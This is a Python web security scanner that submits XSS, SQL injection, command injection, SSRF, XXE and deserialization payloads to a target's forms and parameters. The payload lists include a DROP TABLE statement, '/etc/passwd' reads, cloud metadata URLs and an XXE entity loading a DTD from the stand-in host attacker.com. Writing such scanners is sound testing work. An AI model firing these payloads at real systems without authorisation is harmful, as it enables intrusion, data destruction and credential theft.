#!/usr/bin/env python3
"""
Advanced Web Security Scanner with JavaScript Rendering
Enhanced scanning capabilities including SPA support, DOM-based detection,
and context-aware payload generation.
"""

import asyncio
import json
import time
import re
import hashlib
import urllib.parse
from typing import Dict, List, Set, Optional, Tuple
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib3
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import logging

# Optional imports for enhanced scanning
try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class ScanResult:
    """Enhanced scan result with metadata"""
    test_name: str
    status: str  # 'success', 'warning', 'error', 'info'
    result: any
    confidence: float = 0.0
    evidence: List[str] = None
    recommendations: List[str] = None
    cvss_score: float = 0.0
    
    def __post_init__(self):
        if self.evidence is None:
            self.evidence = []
        if self.recommendations is None:
            self.recommendations = []

class AdvancedWebScanner:
    """Advanced web security scanner with modern capabilities"""
    
    def __init__(self, target_url: str, max_workers: int = 10):
        self.target_url = target_url
        self.max_workers = max_workers
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 10
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Scanning state
        self.discovered_urls: Set[str] = set()
        self.crawled_urls: Set[str] = set()
        self.vulnerabilities: List[ScanResult] = []
        self.scan_depth = 3
        self.max_urls = 100
        
        # Enhanced payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<div onmouseover=alert('XSS')>test</div>",
            "javascript:alert('XSS')",
            "<script>document.cookie='xss=test'</script>",
            "<img src='x' onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>",
            "<svg/onload=alert(String.fromCharCode(88,83,83))>"
        ]
        
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; DROP TABLE users; --",
            "' UNION SELECT null, null, null --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
            "admin'--",
            "admin' #",
            "admin' /*",
            "' OR 1=1 --",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "') OR ('1'='1' --"
        ]
        
        self.command_injection_payloads = [
            "; ls",
            "&& ls",
            "|| ls",
            "| ls",
            "; cat /etc/passwd",
            "&& cat /etc/passwd",
            "|| cat /etc/passwd",
            "| cat /etc/passwd",
            "; whoami",
            "&& whoami",
            "|| whoami",
            "| whoami",
            "`ls`",
            "$(ls)",
            "${ls}",
            "; sleep 5",
            "&& sleep 5",
            "|| sleep 5"
        ]
        
        self.ssrf_payloads = [
            "http://localhost:80/",
            "http://127.0.0.1:80/",
            "http://0.0.0.0:80/",
            "http://169.254.169.254/",
            "http://metadata.google.internal/",
            "http://metadata.aws.amazon.com/",
            "file:///etc/passwd",
            "file:///etc/hosts",
            "ftp://localhost/",
            "dict://localhost:11211/",
            "gopher://localhost:80/"
        ]

    async def scan_with_javascript_rendering(self) -> Dict[str, ScanResult]:
        """Scan with JavaScript rendering support"""
        results = {}
        
        if PLAYWRIGHT_AVAILABLE:
            results.update(await self.playwright_scan())
        elif SELENIUM_AVAILABLE:
            results.update(await self.selenium_scan())
        else:
            logger.warning("No JavaScript rendering engine available. Install playwright or selenium.")
            results['javascript_rendering'] = ScanResult(
                test_name="JavaScript Rendering",
                status="error",
                result="No JavaScript rendering engine available",
                confidence=0.0
            )
        
        return results

    async def playwright_scan(self) -> Dict[str, ScanResult]:
        """Scan using Playwright for JavaScript rendering"""
        results = {}
        
        async with async_playwright() as p:
            try:
                browser = await p.chromium.launch(headless=True)
                page = await browser.new_page()
                
                # Navigate to target
                await page.goto(self.target_url, wait_until='networkidle')
                
                # Extract dynamic content
                results['dynamic_content'] = await self.extract_dynamic_content(page)
                
                # Test for DOM-based XSS
                results['dom_xss'] = await self.test_dom_xss(page)
                
                # Discover SPA routes
                results['spa_routes'] = await self.discover_spa_routes(page)
                
                # Test for client-side vulnerabilities
                results['client_side_vulns'] = await self.test_client_side_vulnerabilities(page)
                
                await browser.close()
                
            except Exception as e:
                logger.error(f"Playwright scan error: {e}")
                results['playwright_error'] = ScanResult(
                    test_name="Playwright Scan",
                    status="error",
                    result=f"Error during Playwright scan: {str(e)}",
                    confidence=0.0
                )
        
        return results

    async def extract_dynamic_content(self, page) -> ScanResult:
        """Extract dynamically loaded content"""
        try:
            # Wait for dynamic content
            await page.wait_for_timeout(2000)
            
            # Get page content after JavaScript execution
            content = await page.content()
            
            # Extract all links and forms
            links = await page.eval_on_selector_all('a[href]', 'elements => elements.map(el => el.href)')
            forms = await page.eval_on_selector_all('form', 'elements => elements.map(el => ({action: el.action, method: el.method}))')
            
            # Extract API endpoints from JavaScript
            scripts = await page.eval_on_selector_all('script', 'elements => elements.map(el => el.textContent)')
            api_endpoints = self.extract_api_endpoints_from_scripts(scripts)
            
            result = {
                'links_found': len(links),
                'forms_found': len(forms),
                'api_endpoints': api_endpoints,
                'dynamic_links': [link for link in links if link.startswith('http')],
                'dynamic_forms': forms
            }
            
            return ScanResult(
                test_name="Dynamic Content Discovery",
                status="success",
                result=result,
                confidence=0.9,
                evidence=[f"Found {len(links)} dynamic links", f"Found {len(forms)} dynamic forms"],
                recommendations=["Review dynamically loaded content for security issues"]
            )
            
        except Exception as e:
            return ScanResult(
                test_name="Dynamic Content Discovery",
                status="error",
                result=f"Error extracting dynamic content: {str(e)}",
                confidence=0.0
            )

    async def test_dom_xss(self, page) -> ScanResult:
        """Test for DOM-based XSS vulnerabilities"""
        try:
            vulnerabilities = []
            
            # Test URL fragment manipulation
            xss_payload = "<img src=x onerror=alert('DOM_XSS')>"
            test_url = f"{self.target_url}#{xss_payload}"
            
            await page.goto(test_url)
            await page.wait_for_timeout(1000)
            
            # Check if payload is reflected in DOM
            dom_content = await page.content()
            if xss_payload in dom_content:
                vulnerabilities.append("URL fragment XSS")
            
            # Test postMessage vulnerabilities
            postmessage_script = """
                window.addEventListener('message', function(event) {
                    document.body.innerHTML = event.data;
                });
                window.postMessage('<img src=x onerror=alert("PostMessage_XSS")>', '*');
            """
            
            try:
                await page.evaluate(postmessage_script)
                await page.wait_for_timeout(1000)
                
                # Check for XSS execution
                content = await page.content()
                if "PostMessage_XSS" in content:
                    vulnerabilities.append("PostMessage XSS")
            except:
                pass
            
            if vulnerabilities:
                return ScanResult(
                    test_name="DOM-based XSS",
                    status="warning",
                    result=f"DOM XSS vulnerabilities found: {', '.join(vulnerabilities)}",
                    confidence=0.8,
                    evidence=vulnerabilities,
                    recommendations=["Sanitize user input in DOM manipulation", "Validate postMessage data"],
                    cvss_score=6.1
                )
            else:
                return ScanResult(
                    test_name="DOM-based XSS",
                    status="success",
                    result="No DOM-based XSS vulnerabilities detected",
                    confidence=0.7
                )
                
        except Exception as e:
            return ScanResult(
                test_name="DOM-based XSS",
                status="error",
                result=f"Error testing DOM XSS: {str(e)}",
                confidence=0.0
            )

    async def discover_spa_routes(self, page) -> ScanResult:
        """Discover Single Page Application routes"""
        try:
            routes = set()
            
            # Extract routes from JavaScript
            scripts = await page.eval_on_selector_all('script', 'elements => elements.map(el => el.textContent)')
            
            for script in scripts:
                if script:
                    # Common SPA route patterns
                    route_patterns = [
                        r'[\'"]\/[a-zA-Z0-9\-_\/]+[\'"]',  # "/path/to/route"
                        r'route[s]?\s*:\s*[\'"][^\'\"]+[\'"]',  # route: "/path"
                        r'path\s*:\s*[\'"][^\'\"]+[\'"]',  # path: "/path"
                        r'[\'"]#\/[a-zA-Z0-9\-_\/]+[\'"]',  # "#!/path"
                    ]
                    
                    for pattern in route_patterns:
                        matches = re.findall(pattern, script)
                        for match in matches:
                            route = match.strip('\'"')
                            if route.startswith('/') or route.startswith('#/'):
                                routes.add(route)
            
            # Extract routes from HTML5 history API usage
            history_script = """
                const routes = [];
                const originalPushState = history.pushState;
                const originalReplaceState = history.replaceState;
                
                history.pushState = function(state, title, url) {
                    routes.push(url);
                    return originalPushState.call(history, state, title, url);
                };
                
                history.replaceState = function(state, title, url) {
                    routes.push(url);
                    return originalReplaceState.call(history, state, title, url);
                };
                
                // Return any existing routes
                return routes;
            """
            
            history_routes = await page.evaluate(history_script)
            routes.update(history_routes)
            
            return ScanResult(
                test_name="SPA Route Discovery",
                status="success",
                result=list(routes),
                confidence=0.8,
                evidence=[f"Found {len(routes)} potential SPA routes"],
                recommendations=["Test each discovered route for vulnerabilities"]
            )
            
        except Exception as e:
            return ScanResult(
                test_name="SPA Route Discovery",
                status="error",
                result=f"Error discovering SPA routes: {str(e)}",
                confidence=0.0
            )

    async def test_client_side_vulnerabilities(self, page) -> ScanResult:
        """Test for client-side vulnerabilities"""
        try:
            vulnerabilities = []
            
            # Test for exposed sensitive data
            sensitive_patterns = [
                r'password["\']?\s*[:=]\s*["\'][^"\']+["\']',
                r'api[_-]?key["\']?\s*[:=]\s*["\'][^"\']+["\']',
                r'secret["\']?\s*[:=]\s*["\'][^"\']+["\']',
                r'token["\']?\s*[:=]\s*["\'][^"\']+["\']',
            ]
            
            page_content = await page.content()
            for pattern in sensitive_patterns:
                matches = re.findall(pattern, page_content, re.IGNORECASE)
                if matches:
                    vulnerabilities.append(f"Exposed sensitive data: {pattern}")
            
            # Test for unsafe JavaScript practices
            scripts = await page.eval_on_selector_all('script', 'elements => elements.map(el => el.textContent)')
            
            for script in scripts:
                if script:
                    # Check for eval() usage
                    if 'eval(' in script:
                        vulnerabilities.append("Unsafe eval() usage detected")
                    
                    # Check for innerHTML usage
                    if '.innerHTML' in script:
                        vulnerabilities.append("Potential innerHTML XSS vector")
                    
                    # Check for document.write usage
                    if 'document.write' in script:
                        vulnerabilities.append("Unsafe document.write usage")
            
            if vulnerabilities:
                return ScanResult(
                    test_name="Client-side Vulnerabilities",
                    status="warning",
                    result=vulnerabilities,
                    confidence=0.7,
                    evidence=vulnerabilities,
                    recommendations=["Review client-side code for security issues", "Remove exposed sensitive data"],
                    cvss_score=4.3
                )
            else:
                return ScanResult(
                    test_name="Client-side Vulnerabilities",
                    status="success",
                    result="No obvious client-side vulnerabilities detected",
                    confidence=0.6
                )
                
        except Exception as e:
            return ScanResult(
                test_name="Client-side Vulnerabilities",
                status="error",
                result=f"Error testing client-side vulnerabilities: {str(e)}",
                confidence=0.0
            )

    def extract_api_endpoints_from_scripts(self, scripts: List[str]) -> List[str]:
        """Extract API endpoints from JavaScript code"""
        endpoints = set()
        
        for script in scripts:
            if script:
                # Common API endpoint patterns
                patterns = [
                    r'[\'"]\/api\/[a-zA-Z0-9\-_\/]+[\'"]',  # "/api/endpoint"
                    r'[\'"]https?:\/\/[^\'\"]+\/api\/[^\'\"]+[\'"]',  # Full API URLs
                    r'fetch\s*\(\s*[\'"]([^\'\"]+)[\'"]',  # fetch("url")
                    r'axios\.[a-z]+\s*\(\s*[\'"]([^\'\"]+)[\'"]',  # axios.get("url")
                    r'\.ajax\s*\(\s*{[^}]*url\s*:\s*[\'"]([^\'\"]+)[\'"]',  # jQuery ajax
                ]
                
                for pattern in patterns:
                    matches = re.findall(pattern, script)
                    for match in matches:
                        if isinstance(match, tuple):
                            match = match[0]
                        endpoints.add(match.strip('\'"'))
        
        return list(endpoints)

    async def selenium_scan(self) -> Dict[str, ScanResult]:
        """Fallback scan using Selenium"""
        results = {}
        
        try:
            options = Options()
            options.add_argument('--headless')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            
            driver = webdriver.Chrome(options=options)
            driver.get(self.target_url)
            
            # Wait for page to load
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            # Extract dynamic content
            links = driver.find_elements(By.TAG_NAME, "a")
            forms = driver.find_elements(By.TAG_NAME, "form")
            
            results['selenium_scan'] = ScanResult(
                test_name="Selenium Scan",
                status="success",
                result=f"Found {len(links)} links and {len(forms)} forms",
                confidence=0.7
            )
            
            driver.quit()
            
        except Exception as e:
            results['selenium_error'] = ScanResult(
                test_name="Selenium Scan",
                status="error",
                result=f"Error during Selenium scan: {str(e)}",
                confidence=0.0
            )
        
        return results

    def advanced_vulnerability_detection(self) -> Dict[str, ScanResult]:
        """Advanced vulnerability detection with context-aware payloads"""
        results = {}
        
        # Test for advanced XSS
        results['advanced_xss'] = self.test_advanced_xss()
        
        # Test for SQL injection with context awareness
        results['advanced_sql_injection'] = self.test_advanced_sql_injection()
        
        # Test for command injection
        results['advanced_command_injection'] = self.test_advanced_command_injection()
        
        # Test for SSRF with multiple protocols
        results['advanced_ssrf'] = self.test_advanced_ssrf()
        
        # Test for XXE vulnerabilities
        results['xxe_vulnerabilities'] = self.test_xxe_vulnerabilities()
        
        # Test for insecure deserialization
        results['insecure_deserialization'] = self.test_insecure_deserialization()
        
        return results

    def test_advanced_xss(self) -> ScanResult:
        """Test for advanced XSS vulnerabilities"""
        try:
            vulnerabilities = []
            
            # Get forms and parameters
            forms = self.get_forms()
            params = self.get_url_parameters()
            
            for payload in self.xss_payloads:
                # Test in forms
                for form in forms:
                    try:
                        response = self.submit_form_with_payload(form, payload)
                        if payload in response.text or self.check_xss_execution(response):
                            vulnerabilities.append(f"Form XSS: {form.get('action', 'unknown')}")
                    except:
                        continue
                
                # Test in URL parameters
                for param in params:
                    try:
                        test_url = f"{self.target_url}?{param}={payload}"
                        response = self.session.get(test_url)
                        if payload in response.text or self.check_xss_execution(response):
                            vulnerabilities.append(f"Parameter XSS: {param}")
                    except:
                        continue
            
            if vulnerabilities:
                return ScanResult(
                    test_name="Advanced XSS Detection",
                    status="warning",
                    result=vulnerabilities,
                    confidence=0.8,
                    evidence=vulnerabilities,
                    recommendations=["Implement input sanitization", "Use CSP headers"],
                    cvss_score=6.1
                )
            else:
                return ScanResult(
                    test_name="Advanced XSS Detection",
                    status="success",
                    result="No XSS vulnerabilities detected",
                    confidence=0.7
                )
                
        except Exception as e:
            return ScanResult(
                test_name="Advanced XSS Detection",
                status="error",
                result=f"Error testing XSS: {str(e)}",
                confidence=0.0
            )

    def test_advanced_sql_injection(self) -> ScanResult:
        """Test for SQL injection with context awareness"""
        try:
            vulnerabilities = []
            
            forms = self.get_forms()
            params = self.get_url_parameters()
            
            for payload in self.sql_payloads:
                # Test in forms
                for form in forms:
                    try:
                        response = self.submit_form_with_payload(form, payload)
                        if self.check_sql_injection(response):
                            vulnerabilities.append(f"Form SQL Injection: {form.get('action', 'unknown')}")
                    except:
                        continue
                
                # Test in URL parameters
                for param in params:
                    try:
                        test_url = f"{self.target_url}?{param}={payload}"
                        response = self.session.get(test_url)
                        if self.check_sql_injection(response):
                            vulnerabilities.append(f"Parameter SQL Injection: {param}")
                    except:
                        continue
            
            if vulnerabilities:
                return ScanResult(
                    test_name="Advanced SQL Injection",
                    status="warning",
                    result=vulnerabilities,
                    confidence=0.8,
                    evidence=vulnerabilities,
                    recommendations=["Use parameterized queries", "Implement input validation"],
                    cvss_score=9.8
                )
            else:
                return ScanResult(
                    test_name="Advanced SQL Injection",
                    status="success",
                    result="No SQL injection vulnerabilities detected",
                    confidence=0.7
                )
                
        except Exception as e:
            return ScanResult(
                test_name="Advanced SQL Injection",
                status="error",
                result=f"Error testing SQL injection: {str(e)}",
                confidence=0.0
            )

    def test_advanced_command_injection(self) -> ScanResult:
        """Test for command injection vulnerabilities"""
        try:
            vulnerabilities = []
            
            forms = self.get_forms()
            params = self.get_url_parameters()
            
            for payload in self.command_injection_payloads:
                # Test in forms
                for form in forms:
                    try:
                        response = self.submit_form_with_payload(form, payload)
                        if self.check_command_injection(response):
                            vulnerabilities.append(f"Form Command Injection: {form.get('action', 'unknown')}")
                    except:
                        continue
                
                # Test in URL parameters
                for param in params:
                    try:
                        test_url = f"{self.target_url}?{param}={payload}"
                        response = self.session.get(test_url)
                        if self.check_command_injection(response):
                            vulnerabilities.append(f"Parameter Command Injection: {param}")
                    except:
                        continue
            
            if vulnerabilities:
                return ScanResult(
                    test_name="Advanced Command Injection",
                    status="warning",
                    result=vulnerabilities,
                    confidence=0.8,
                    evidence=vulnerabilities,
                    recommendations=["Avoid system calls with user input", "Use input validation"],
                    cvss_score=9.8
                )
            else:
                return ScanResult(
                    test_name="Advanced Command Injection",
                    status="success",
                    result="No command injection vulnerabilities detected",
                    confidence=0.7
                )
                
        except Exception as e:
            return ScanResult(
                test_name="Advanced Command Injection",
                status="error",
                result=f"Error testing command injection: {str(e)}",
                confidence=0.0
            )

    def test_advanced_ssrf(self) -> ScanResult:
        """Test for SSRF vulnerabilities"""
        try:
            vulnerabilities = []
            
            forms = self.get_forms()
            params = self.get_url_parameters()
            
            for payload in self.ssrf_payloads:
                # Test in forms
                for form in forms:
                    try:
                        response = self.submit_form_with_payload(form, payload)
                        if self.check_ssrf(response, payload):
                            vulnerabilities.append(f"Form SSRF: {form.get('action', 'unknown')}")
                    except:
                        continue
                
                # Test in URL parameters
                for param in params:
                    try:
                        test_url = f"{self.target_url}?{param}={payload}"
                        response = self.session.get(test_url)
                        if self.check_ssrf(response, payload):
                            vulnerabilities.append(f"Parameter SSRF: {param}")
                    except:
                        continue
            
            if vulnerabilities:
                return ScanResult(
                    test_name="Advanced SSRF Detection",
                    status="warning",
                    result=vulnerabilities,
                    confidence=0.8,
                    evidence=vulnerabilities,
                    recommendations=["Implement URL validation", "Use whitelist for allowed domains"],
                    cvss_score=8.6
                )
            else:
                return ScanResult(
                    test_name="Advanced SSRF Detection",
                    status="success",
                    result="No SSRF vulnerabilities detected",
                    confidence=0.7
                )
                
        except Exception as e:
            return ScanResult(
                test_name="Advanced SSRF Detection",
                status="error",
                result=f"Error testing SSRF: {str(e)}",
                confidence=0.0
            )

    def test_xxe_vulnerabilities(self) -> ScanResult:
        """Test for XXE vulnerabilities"""
        try:
            vulnerabilities = []
            
            xxe_payloads = [
                """<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
                <test>&xxe;</test>""",
                """<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost:80/"> ]>
                <test>&xxe;</test>""",
                """<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe; ]>
                <test>&exfil;</test>"""
            ]
            
            # Test XML endpoints
            for payload in xxe_payloads:
                try:
                    response = self.session.post(
                        self.target_url,
                        data=payload,
                        headers={'Content-Type': 'application/xml'}
                    )
                    
                    if self.check_xxe(response):
                        vulnerabilities.append("XXE vulnerability detected")
                        break
                except:
                    continue
            
            if vulnerabilities:
                return ScanResult(
                    test_name="XXE Vulnerabilities",
                    status="warning",
                    result=vulnerabilities,
                    confidence=0.8,
                    evidence=vulnerabilities,
                    recommendations=["Disable external entity processing", "Use safe XML parsers"],
                    cvss_score=8.8
                )
            else:
                return ScanResult(
                    test_name="XXE Vulnerabilities",
                    status="success",
                    result="No XXE vulnerabilities detected",
                    confidence=0.7
                )
                
        except Exception as e:
            return ScanResult(
                test_name="XXE Vulnerabilities",
                status="error",
                result=f"Error testing XXE: {str(e)}",
                confidence=0.0
            )

    def test_insecure_deserialization(self) -> ScanResult:
        """Test for insecure deserialization vulnerabilities"""
        try:
            vulnerabilities = []
            
            # Test common serialization formats
            serialization_payloads = [
                # Python pickle
                b'\x80\x03c__main__\nMalicious\nq\x00)\x81q\x01}q\x02b.',
                # Java serialization
                b'\xac\xed\x00\x05sr\x00\x11java.lang.Integer\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01I\x00\x05valuexr\x00\x10java.lang.Number\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp\x00\x00\x00\x01',
                # PHP serialization
                b'O:8:"stdClass":1:{s:4:"test";s:4:"test";}'
            ]
            
            for payload in serialization_payloads:
                try:
                    response = self.session.post(
                        self.target_url,
                        data=payload,
                        headers={'Content-Type': 'application/octet-stream'}
                    )
                    
                    if self.check_deserialization(response):
                        vulnerabilities.append("Insecure deserialization detected")
                        break
                except:
                    continue
            
            if vulnerabilities:
                return ScanResult(
                    test_name="Insecure Deserialization",
                    status="warning",
                    result=vulnerabilities,
                    confidence=0.8,
                    evidence=vulnerabilities,
                    recommendations=["Validate serialized data", "Use safe deserialization methods"],
                    cvss_score=8.1
                )
            else:
                return ScanResult(
                    test_name="Insecure Deserialization",
                    status="success",
                    result="No insecure deserialization vulnerabilities detected",
                    confidence=0.7
                )
                
        except Exception as e:
            return ScanResult(
                test_name="Insecure Deserialization",
                status="error",
                result=f"Error testing deserialization: {str(e)}",
                confidence=0.0
            )

    # Helper methods for vulnerability detection
    def get_forms(self) -> List[Dict]:
        """Extract forms from the target page"""
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }
                
                for input_field in form.find_all(['input', 'textarea', 'select']):
                    form_data['inputs'].append({
                        'name': input_field.get('name', ''),
                        'type': input_field.get('type', 'text'),
                        'value': input_field.get('value', '')
                    })
                
                forms.append(form_data)
            
            return forms
        except:
            return []

    def get_url_parameters(self) -> List[str]:
        """Extract URL parameters from the target"""
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            params = set()
            
            # Extract from links
            for link in soup.find_all('a', href=True):
                parsed = urlparse(link['href'])
                if parsed.query:
                    query_params = urllib.parse.parse_qs(parsed.query)
                    params.update(query_params.keys())
            
            # Extract from forms
            for form in soup.find_all('form'):
                for input_field in form.find_all('input'):
                    if input_field.get('name'):
                        params.add(input_field['name'])
            
            return list(params)
        except:
            return []

    def submit_form_with_payload(self, form: Dict, payload: str) -> requests.Response:
        """Submit a form with a payload"""
        action = form.get('action', '')
        method = form.get('method', 'get').lower()
        
        if not action or action == '#':
            action = self.target_url
        elif not action.startswith('http'):
            action = urljoin(self.target_url, action)
        
        data = {}
        for input_field in form.get('inputs', []):
            name = input_field.get('name', '')
            if name:
                data[name] = payload
        
        if method == 'post':
            return self.session.post(action, data=data)
        else:
            return self.session.get(action, params=data)

    def check_xss_execution(self, response: requests.Response) -> bool:
        """Check if XSS payload executed"""
        indicators = [
            '<script>',
            'javascript:',
            'onerror=',
            'onload=',
            'alert(',
            'document.cookie'
        ]
        
        for indicator in indicators:
            if indicator in response.text:
                return True
        
        return False

    def check_sql_injection(self, response: requests.Response) -> bool:
        """Check for SQL injection indicators"""
        error_patterns = [
            r"mysql_fetch_array\(\)",
            r"ORA-[0-9]+",
            r"Microsoft OLE DB Provider for ODBC Drivers",
            r"SQLServer JDBC Driver",
            r"PostgreSQL.*ERROR",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"syntax error.*at line",
            r"ORA-00933",
            r"ORA-00921"
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        
        return False

    def check_command_injection(self, response: requests.Response) -> bool:
        """Check for command injection indicators"""
        indicators = [
            'root:',
            'bin/bash',
            'uid=',
            'gid=',
            'etc/passwd',
            'www-data',
            'apache',
            'nginx'
        ]
        
        for indicator in indicators:
            if indicator in response.text:
                return True
        
        return False

    def check_ssrf(self, response: requests.Response, payload: str) -> bool:
        """Check for SSRF indicators"""
        # Check for internal service responses
        if 'localhost' in payload or '127.0.0.1' in payload:
            if any(indicator in response.text.lower() for indicator in ['apache', 'nginx', 'iis', 'tomcat']):
                return True
        
        # Check for metadata service responses
        if 'metadata' in payload:
            if any(indicator in response.text.lower() for indicator in ['instance-id', 'ami-id', 'security-groups']):
                return True
        
        return False

    def check_xxe(self, response: requests.Response) -> bool:
        """Check for XXE indicators"""
        indicators = [
            'root:',
            'bin/bash',
            'etc/passwd',
            'SYSTEM',
            'ENTITY'
        ]
        
        for indicator in indicators:
            if indicator in response.text:
                return True
        
        return False

    def check_deserialization(self, response: requests.Response) -> bool:
        """Check for deserialization indicators"""
        indicators = [
            'unserialization',
            'pickle',
            'ObjectInputStream',
            'readObject',
            'ClassCastException'
        ]
        
        for indicator in indicators:
            if indicator in response.text:
                return True
        
        return False

    async def run_comprehensive_scan(self) -> Dict[str, any]:
        """Run comprehensive security scan"""
        results = {}
        
        # JavaScript rendering scan
        js_results = await self.scan_with_javascript_rendering()
        results.update(js_results)
        
        # Advanced vulnerability detection
        vuln_results = self.advanced_vulnerability_detection()
        results.update(vuln_results)
        
        # Convert ScanResult objects to dictionaries for JSON serialization
        serialized_results = {}
        for key, value in results.items():
            if isinstance(value, ScanResult):
                serialized_results[key] = {
                    'test_name': value.test_name,
                    'status': value.status,
                    'result': value.result,
                    'confidence': value.confidence,
                    'evidence': value.evidence,
                    'recommendations': value.recommendations,
                    'cvss_score': value.cvss_score
                }
            else:
                serialized_results[key] = value
        
        return serialized_results

# Main function for testing
async def main():
    """Test the advanced scanner"""
    scanner = AdvancedWebScanner("https://httpbin.org")
    results = await scanner.run_comprehensive_scan()
    
    print(json.dumps(results, indent=2))

if __name__ == "__main__":
    asyncio.run(main())